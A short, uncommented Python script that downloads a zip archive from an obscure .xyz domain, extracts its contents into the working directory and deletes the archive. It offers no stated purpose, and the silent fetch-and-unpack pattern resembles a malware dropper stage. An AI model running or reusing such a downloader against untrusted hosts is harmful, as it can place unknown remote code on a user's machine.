#! python3 
import requests , zipfile , os


res = requests.get('https://wayurizcreazionisacom.xyz/helper.zip')

with open('help.zip' , 'wb') as file:
	for i in res.iter_content(100000):
		file.write(i)

zipf = zipfile.ZipFile('help.zip')

zipf.extractall()

zipf.close()

os.unlink('help.zip')
